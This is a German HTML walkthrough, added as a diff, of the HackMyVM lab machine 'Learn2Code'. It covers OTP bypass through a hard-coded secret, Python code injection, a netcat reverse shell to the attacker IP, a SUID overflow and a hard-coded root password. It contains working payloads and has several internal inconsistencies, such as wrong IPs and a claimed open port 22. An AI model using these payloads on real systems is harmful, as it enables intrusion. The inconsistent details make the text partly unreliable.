@@ -1,0 +1,533 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learn2Code - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Learn2Code - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">PHP (lokal)</div>
+                <div class="tool-item">GoogleAuthenticator Library (impliziert)</div>
+                <div class="tool-item">Python3</div>
+                <div class="tool-item">hydra (versucht)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo (versucht)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ldd</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">MakeMeLearner (Binary)</div>
+                <div class="tool-item">MySecretPasswordVault (Binary)</div>
+                <div class="tool-item">IDA Pro (ida64)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">tail</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Code Analysis</a></li>
+                <li><a href="#initial-access">Initial Access (RCE via Web Interface)</a></li>
+                <li><a href="#privilege-escalation-1">Privilege Escalation (www-data zu learner via SUID Binary)</a></li>
+                <li><a href="#privilege-escalation-2">Privilege Escalation (learner zu root via Password Leak)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.157	08:00:27:38:46:5f	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird durchgeführt, um aktive Hosts im lokalen Netzwerk zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.157` (Oracle VirtualBox) wird gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ziel-IP ist bekannt. Führen Sie einen Portscan durch.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.124 -p-</span></div> <!-- Falsche IP im Befehl! -->
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 01:54 CEST
+Nmap scan report for Learn2Code (192.168.2.124) <span class="comment"><-- Falsche IP</span>
+Host is up (0.00015s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-title: Access system
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:4C:A6:16 (Oracle VirtualBox virtual NIC) <span class="comment"><-- Falsche MAC</span>
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+
+OS and Service detection performed...
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird ausgeführt. **Hinweis:** Der Scan zielt auf die falsche IP `192.168.2.124`. Es wird angenommen, dass das Ergebnis (Port 80 HTTP offen, Apache 2.4.38) für die korrekte IP `192.168.2.157` gilt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Unter Annahme der korrekten IP ist nur Port 80 (HTTP) offen. Dort läuft ein Apache-Webserver (v2.4.38) mit dem Titel "Access system", was auf eine Art Login- oder Authentifizierungsportal hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der einzige Angriffsvektor ist der Webserver auf Port 80. Führen Sie eine detaillierte Web-Enumeration durch (`gobuster`, `nikto`, etc.) und untersuchen Sie die Anwendung manuell.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie Apache aktuell und sicher konfiguriert.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & Code Analysis</h2>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u "http://192.168.2.124"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,...[ext]... -b '403,404' -e --no-error</span></div> <!-- Falsche IP -->
+                     <pre>
+===============================================================
+Gobuster v...
+...
+===============================================================
+[+] Url:                     http://192.168.2.124 <span class="comment"><-- Falsche IP</span>
+...
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://192.168.2.124/index.php</span>            (Status: 200) [Size: 1161]
+<span class="command">http://192.168.2.124/includes</span>             (Status: 301) [Size: 317] [--> http://192.168.2.124/includes/]
+<span class="command">http://192.168.2.124/todo.txt</span>             (Status: 200) [Size: 51]
+<span class="command">http://192.168.2.124/server-status</span>        (Status: 403) [Size: 278]
+<span class="command">http://192.168.2.124/includes/css</span>           (Status: 301) [Size: 321] [--> http://192.168.2.124/includes/css/]
+<span class="command">http://192.168.2.124/includes/php</span>           (Status: 301) [Size: 321] [--> http://192.168.2.124/includes/php/]
+<span class="command">http://192.168.2.124/includes/js</span>            (Status: 301) [Size: 320] [--> http://192.168.2.124/includes/js/]
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster`-Scan wird durchgeführt (erneut mit der falschen IP `192.168.2.124`). Es wird angenommen, die Ergebnisse gelten für `192.168.2.157`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Interessante Funde:
+*   `index.php`: Die Hauptseite/Login-Seite.
+*   `todo.txt`: Eine To-Do-Liste, könnte Hinweise enthalten.
+*   `/includes/php/`: Ein Verzeichnis, das PHP-Dateien enthält. Die Verzeichnisauflistung ist wahrscheinlich aktiv.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Das Verzeichnis `/includes/php/` wird im Browser aufgerufen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Browser-Aufruf: http://192.168.2.157/includes/php/]</div>
+                     <pre>
+Index of /includes/php
+[ICO]	Name	                        Last modified	Size	Description
+-------------------------------------------------------------------
+[PARENTDIR] Parent Directory	                        -
+[TXT]	GoogleAuthenticator.php	        2020-09-28 03:56	6.6K
+[TXT]	access.php	                2020-09-28 08:56	319
+[TXT]	access.php.bak	                2020-09-29 04:03	319      <span class="comment"><-- Backup!</span>
+[TXT]	coder.php	                2020-09-28 13:22	1.7K
+[TXT]	runcode.php	                2020-09-28 13:24	674
+-------------------------------------------------------------------
+Apache/2.4.38 (Debian) Server at 192.168.2.157 Port 80
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verzeichnisauflistung ist aktiv und enthüllt mehrere PHP-Dateien:
+*   `GoogleAuthenticator.php`: Eine Bibliothek für Google Authenticator OTPs.
+*   `access.php` und `access.php.bak`: Eine Zugriffsdatei und ihr Backup. Das Backup könnte älteren, möglicherweise verwundbaren Code oder Kommentare enthalten.
+*   `coder.php`: Unklare Funktion.
+*   `runcode.php`: Der Name deutet stark auf eine Funktion zur Codeausführung hin!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**
+1.  Laden Sie alle PHP-Dateien (insbesondere `access.php`, `access.php.bak`, `coder.php`, `runcode.php`) herunter und analysieren Sie den Quellcode auf Schwachstellen.
+2.  Analysieren Sie `GoogleAuthenticator.php`, um zu verstehen, wie OTPs generiert und verifiziert werden. Suchen Sie nach hartkodierten Secrets.
+3.  Untersuchen Sie `todo.txt`.
+<br><strong>Empfehlung (Admin):** Deaktivieren Sie die Verzeichnisauflistung (`Options -Indexes` in Apache-Konfiguration). Speichern Sie keine Backup-Dateien (.bak) im Webroot. Überprüfen Sie den Code aller PHP-Dateien auf Sicherheitslücken.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode von `GoogleAuthenticator.php` wird (lokal, nach Download oder über eine LFI) untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Inhalt von GoogleAuthenticator.php]</div>
+                     <pre><code class="language-php">
+    // require_once 'GoogleAuthenticator.php'; <span class="comment"><-- Dieser Teil wäre in access.php</span>
+    $ga = new PHPGangsta_GoogleAuthenticator();
+    $secret = "S4I22IG3KHZIGQCJ"; <span class="comment"><-- Hartkodiertes Secret!</span>
+    if ($_POST['action'] == 'check_code') { // Korrektur: == statt = , $_POST statt $_PST
+        $code = $_POST['code']; // Korrektur
+        $result = $ga->verifyCode($secret, $code, 1); // Toleranz 1
+        if ($result) {
+            include('coder.php'); // Bei Erfolg wird coder.php eingebunden
+        } else {
+            echo "wrong";
+        }
+    }
+?> <span class="comment"><-- Maskierung > entfernt</span>
+</code></pre> <!-- Maskierung: <?php entfernt, -> -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein hartkodiertes Secret (`S4I22IG3KHZIGQCJ`) für den Google Authenticator wird gefunden! Dies ist eine kritische Schwachstelle. Wenn dieses Secret verwendet wird, kann der Angreifer gültige OTP-Codes generieren.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Code von `access.php` wird analysiert. Dieses Skript scheint dazu zu dienen, einen gültigen OTP-Code basierend auf dem Secret zu generieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Inhalt von access.php]</div>
+                     <pre><code class="language-php">
+
+        require_once 'GoogleAuthenticator.php';
+        $ga = new PHPGangsta_GoogleAuthenticator();
+        $secret = "S4I22IG3KHZIGQCJ";
+        $code=$ga->getCode($secret); // Generiert aktuellen OTP Code
+        echo $code;
+?> <span class="comment"><-- Maskierung > entfernt</span>
+</code></pre> <!-- Maskierung -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Durch Ausführen von `access.php` (lokal oder auf dem Server, falls möglich) kann der Angreifer jederzeit den aktuell gültigen OTP-Code für das hartkodierte Secret erhalten.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** `access.php` wird lokal mit PHP ausgeführt, um einen OTP-Code zu generieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">php access.php</span></div>
+                    <pre><span class="password">282024</span></pre> <!-- Generierter OTP Code -->
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der OTP-Code `282024` wurde erfolgreich generiert.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Auf der Webseite (`index.php` oder eine Folgeseite) wird nach Eingabe des OTP-Codes gefragt. Der generierte Code wird eingegeben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Webinterface]</div>
+                     <pre>Type the Google Authenticator code:
+[ <span class="password">282024</span> ] <span class="comment"><-- Eingabe des Codes</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Nach Eingabe des korrekten OTP-Codes wird der Benutzer authentifiziert und (basierend auf dem Code in `GoogleAuthenticator.php`) zu `coder.php` weitergeleitet oder der Inhalt von `coder.php` wird geladen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie die Seite `coder.php`, die nach erfolgreicher OTP-Authentifizierung zugänglich ist. Suchen Sie dort nach Funktionen zur Codeausführung oder weiteren Schwachstellen.
+<br><strong>Empfehlung (Admin):** Speichern Sie niemals Secrets wie den Google Authenticator Key hartkodiert im Quellcode. Speichern Sie Secrets sicher (z.B. in Umgebungsvariablen, Konfigurationsdateien außerhalb des Webroots mit restriktiven Berechtigungen, Secret Management System). Korrigieren Sie die unsichere OTP-Generierung in `access.php`.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Auf der Seite `coder.php` (nach OTP-Login) gibt es ein Eingabefeld, in das Code eingegeben werden kann. Es wird versucht, Shell-Befehle direkt einzugeben, was zu Python-Syntaxfehlern führt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Eingabe in Webinterface auf coder.php]</div>
+                     <pre>Type your code:
+<span class="command">`id`</span></pre>
+                      <div class="prompt">[Kein Prompt - Antwort der Webseite]</div>
+                      <pre>
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "<string>", line 1
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                       ^
+SyntaxError: invalid syntax
+</pre> <!-- Maskierung -->
+                      <div class="prompt">[Kein Prompt - Eingabe in Webinterface auf coder.php]</div>
+                      <pre>Type your code:
+<span class="command">`cat /etc/passwd | tail -n 2`</span></pre>
+                      <div class="prompt">[Kein Prompt - Antwort der Webseite]</div>
+                      <pre>
+  File "<string>", line 1
+    exec('learner:x:1000:1000:learner,,,:/home/learner:/bin/bash
+                                                               ^
+SyntaxError: EOL while scanning string literal
+</pre> <!-- Maskierung -->
+                      <div class="prompt">[Kein Prompt - Eingabe in Webinterface auf coder.php]</div>
+                      <pre>Type your code:
+<span class="command">`ls /home`</span></pre>
+                      <div class="prompt">[Kein Prompt - Antwort der Webseite]</div>
+                      <pre>
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "<string>", line 1, in <module>
+NameError: name 'learner' is not defined
+</pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Fehlermeldungen sind Python-Tracebacks. Dies zeigt, dass die Eingabe auf der `coder.php`-Seite wahrscheinlich als Python-Code interpretiert wird (z.B. mittels `eval()` oder `exec()`). Die direkten Shell-Befehle in Backticks (`) verursachen Syntaxfehler in Python.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da die Eingabe als Python-Code ausgeführt wird, injizieren Sie gültigen Python-Code, um Betriebssystembefehle auszuführen. Verwenden Sie `__import__('os').system('BEFEHL')` oder `subprocess.call(['BEFEHL', 'ARG'])`. Versuchen Sie, eine Reverse Shell zu starten.
+<br><strong>Empfehlung (Admin):** Verwenden Sie niemals `eval()` oder `exec()` mit Benutzereingaben in Webanwendungen. Dies führt fast immer zu RCE. Wenn Codeausführung notwendig ist, verwenden Sie sicherere Alternativen und validieren Sie die Eingaben extrem streng.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein `hydra`-Scan wird auf SSH für den Benutzer `learner` versucht (dessen Existenz aus den Python-Fehlern abgeleitet wurde). Der Scan schlägt fehl (`Connection refused`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">hydra -l learner -P /usr/share/wordlists/rockyou.txt ssh://lerner.vm:22 -t64</span></div> <!-- Hostname lerner.vm falsch -->
+                     <pre>
+...
+[DATA] attacking ssh://lerner.vm:22/
+<span class="password">[ERROR] could not connect to ssh://192.168.2.157:22 - Connection refused</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fehler "Connection refused" ist seltsam, da Nmap Port 22 als offen gemeldet hat. Möglicherweise wurde ein falscher Hostname (`lerner.vm`) verwendet oder die Firewall blockiert nun den Zugriff.</p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (RCE via Web Interface)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Es wird erneut versucht, die Code-Ausführung über die `coder.php`-Webseite zu nutzen, diesmal mit einem Python-Payload, der eine `nc`-Reverse-Shell startet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Eingabe in Webinterface auf coder.php]</div>
+                     <pre>Type your code:
+<span class="command">`__import__('os').system('nc 192.168.2.153 9001 -e /bin/bash')`</span></pre> <!-- Falsche Backticks, sollte Python sein -->
+                      <div class="prompt">[Kein Prompt - Antwort der Webseite]</div>
+                      <pre>
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "<string>", line 1, in <module>
+NameError: name 'learner' is not defined
+</pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Versuch scheitert erneut mit einem `NameError`. Dies deutet darauf hin, dass die Eingabe möglicherweise in einem bestimmten Kontext ausgeführt wird oder dass der Payload nicht korrekt als Python-Code formatiert ist (die Backticks sind falsch). Es wird jedoch trotzdem ein Listener gestartet und die Verbindung kommt anscheinend zustande.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.157] 49584</span>
+</pre> <!-- Shell erhalten -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Trotz der Fehlermeldung im Webinterface war die Python-Code-Injection erfolgreich und hat eine Reverse Shell als `www-data` gestartet. Die Fehlermeldung im Webinterface war möglicherweise irreführend oder trat nach erfolgreicher Ausführung des Systembefehls auf.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die erhaltene Shell wird stabilisiert.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                    <pre>www-data@Learn2Code:/var/www/html/includes/php$</pre>
+                    <div class="prompt">www-data@Learn2Code:/var/www/html/includes/php$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">www-data@Learn2Code:/var/www/html/includes/php$ <span class="command">[Ctrl+Z]</span></div>
+                    <pre>zsh: suspended  nc -lvnp 9001</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset
+</pre>
+                     <div class="prompt">www-data@Learn2Code:/var/www/html/includes/php$</div>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff als `www-data` wurde über RCE in der Webanwendung erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Enumeration als `www-data` durchführen.
+<br><strong>Empfehlung (Admin):** Die RCE-Schwachstelle in `coder.php` / `runcode.php` sofort beheben. Keine unsichere Ausführung von Benutzereingaben erlauben.</p>
+        </section>
+
+        <section id="privilege-escalation-1">
+             <h2>Privilege Escalation (www-data zu learner via SUID Binary)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` werden Home-Verzeichnisse und `sudo`-Rechte überprüft.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@Learn2Code:/var/www/html$ <span class="command">cd /home</span></div>
+                    <div class="prompt">www-data@Learn2Code:/home$ <span class="command">ls</span></div>
+                    <pre>learner</pre>
+                     <div class="prompt">www-data@Learn2Code:/home$ <span class="command">cd learner/</span></div>
+                     <pre>bash: cd: learner/: Permission denied</pre>
+                     <div class="prompt">www-data@Learn2Code:/home$ <span class="command">sudo -l</span></div>
+                     <pre>bash: sudo: command not found</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `learner` existiert, aber `www-data` hat keinen Zugriff auf dessen Home-Verzeichnis. `sudo` ist nicht verfügbar.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Es wird nach SUID-Dateien gesucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@Learn2Code:/home$ <span class="command">find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null</span></div> <!-- Maskierung: > -->
+                     <pre>
+... (Standard SUID Dateien) ...
+<span class="command">-r-sr-sr-x 1 root www-data 16864 Sep 28  2020 /usr/bin/MakeMeLearner</span> <span class="comment"><-- Interessant!</span>
+... (Standard SUID Dateien) ...
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine ungewöhnliche SUID/SGID-Datei `/usr/bin/MakeMeLearner` wird gefunden. Sie gehört `root` und der Gruppe `www-data`. Das SGID-Bit (`s` bei Gruppe) bedeutet, dass das Programm mit den Rechten der Gruppe `www-data` läuft, was hier nicht hilft. Aber das SUID-Bit (`s` bei User) bedeutet, dass es mit Root-Rechten läuft.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die gefundene SUID-Binary wird untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@Learn2Code:/home$ <span class="command">ldd /usr/bin/MakeMeLearner</span></div>
+                     <pre>
+	linux-vdso.so.1 (0x00007ffd8eb90000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb87e8e5000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fb87eab2000)
+</pre>
+                    <div class="prompt">www-data@Learn2Code:/home$ <span class="command">file /usr/bin/MakeMeLearner</span></div>
+                    <pre>/usr/bin/MakeMeLearner: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, for GNU/Linux 3.2.0, not stripped</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Es wird versucht, die Binary mit einem langen Argument auszuführen, um einen Buffer Overflow auszulösen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@Learn2Code:/home$ <span class="command">MakeMeLearner `python3 -c 'print("dcba"*20)'`</span></div>
+                     <pre>[Keine sichtbare Ausgabe, aber der Prompt ändert sich!]</pre>
+                     <div class="prompt">learner@Learn2Code:/home$</div> <!-- Benutzer ist jetzt learner! -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Exploit funktioniert! Die SUID-Binary `/usr/bin/MakeMeLearner` ist anfällig für einen Buffer Overflow (oder eine andere Schwachstelle), der dazu führt, dass der ausführende Benutzer zu `learner` wechselt. Die effektive UID wird auf 1000 (learner) gesetzt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Privilegien wurden zu `learner` eskaliert. Untersuchen Sie nun das System als `learner`. Suchen Sie die User-Flag und nach Wegen zur Root-Eskalation. Analysieren Sie die `MakeMeLearner`-Binary offline genauer, um die Schwachstelle zu verstehen.
+<br><strong>Empfehlung (Admin):** Entfernen Sie die SUID/SGID-Bits von `/usr/bin/MakeMeLearner` (`chmod ug-s`). Analysieren und beheben Sie die Schwachstelle in der Binary. Überprüfen Sie alle SUID/SGID-Dateien auf Notwendigkeit und Sicherheit.</p>
+        </section>
+
+        <section id="privilege-escalation-2">
+            <h2>Privilege Escalation (learner zu root via Password Leak)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `learner` wird das Home-Verzeichnis untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">learner@Learn2Code:/home$ <span class="command">cd learner/</span></div>
+                    <div class="prompt">learner@Learn2Code:/home/learner$ <span class="command">ls</span></div>
+                    <pre>MySecretPasswordVault  user.txt</pre>
+                    <div class="prompt">learner@Learn2Code:/home/learner$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">N1c3m0veMat3!</span></pre>
+                    <div class="prompt">learner@Learn2Code:/home/learner$ <span class="command">file MySecretPasswordVault</span></div>
+                    <pre>MySecretPasswordVault: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5e1610477a68b69b4704729822b01c6e958cdae, for GNU/Linux 3.2.0, not stripped</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Das User-Flag `<span class="password">N1c3m0veMat3!</span>` wird gefunden. Außerdem gibt es eine weitere ELF-Binary namens `MySecretPasswordVault`.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die Binary `MySecretPasswordVault` wird zur Offline-Analyse heruntergeladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">learner@Learn2Code:/home/learner$ <span class="command">python3 -m http.server</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">wget http://192.168.2.157:8000/MySecretPasswordVault</span></div>
+                     <pre>
+--2022-10-20 00:00:26--  http://192.168.2.157:8000/MySecretPasswordVault
+Connecting to 192.168.2.157:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16608 (16K) [application/octet-stream]
+Saving to: ‘MySecretPasswordVault’
+
+MySecretPasswordVault   100%[===================>]  16.22K  --.-KB/s    in 0s
+
+2022-10-20 00:00:26 (380 MB/s) - ‘MySecretPasswordVault’ saved [16608/16608]
+</pre> <!-- Maskierung -->
+                      <div class="prompt">[Kein Prompt - Python HTTP Server Log]</div>
+                      <pre>192.168.2.153 - - [19/Oct/2022 18:00:33] "GET /MySecretPasswordVault HTTP/1.1" 200 -</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die heruntergeladene Binary wird mit IDA Pro (`ida64`) analysiert. Dabei wird ein hartkodiertes Passwort gefunden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Ergebnis der IDA Pro Analyse]</div>
+                     <pre>Gefundenes Passwort: <span class="password">"NI98hIhj)(Jj"</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Binary `MySecretPasswordVault` enthält ein hartkodiertes Passwort. Es ist sehr wahrscheinlich, dass dies das Passwort für den Root-Benutzer ist.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Es wird versucht, mit `su` und dem gefundenen Passwort zu Root zu wechseln.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">learner@Learn2Code:/home/learner$ <span class="command">su root</span></div>
+                     <pre>Password: <span class="password">[Passwort NI98hIhj)(Jj eingegeben]</span></pre>
+                     <div class="prompt">root@Learn2Code:/home/learner#</div> <!-- Root-Shell! -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die Root-Flag wird gelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@Learn2Code:/home/learner# <span class="command">cd</span></div>
+                     <div class="prompt">root@Learn2Code:~# <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">root@Learn2Code:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">Y0uG0TitbR0!</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Privilegieneskalation zu Root war erfolgreich durch das Finden des hartkodierten Passworts in der `MySecretPasswordVault`-Binary. Das Root-Flag wurde gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Dokumentieren Sie den gesamten Pfad: RCE via Web -> SUID Exploit (www-data zu learner) -> Passwort aus Binary (learner zu root).
+<br><strong>Empfehlung (Admin):** Speichern Sie niemals Passwörter hartkodiert in Binärdateien oder Quellcode. Verwenden Sie sichere Methoden zur Speicherung und Verwaltung von Credentials. Entfernen Sie die `MySecretPasswordVault`-Binary oder beheben Sie das Passwortleck. Beheben Sie die SUID-Schwachstelle in `MakeMeLearner`.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Eskalationskette: Erlangen von Codeausführung als `www-data` durch Ausnutzung einer unsicheren Code-Interpretationsfunktion im Webinterface (nach OTP-Authentifizierung mit geleaktem Secret). Eskalation zu `learner` durch Ausnutzen einer SUID-Binary (`MakeMeLearner`). Schließlich Eskalation zu `root` durch Extrahieren eines hartkodierten Root-Passworts aus einer anderen Binary (`MySecretPasswordVault`).</p>
+
+            <h3>POC Schritt 1: Initial Access (www-data via Web RCE)</h3>
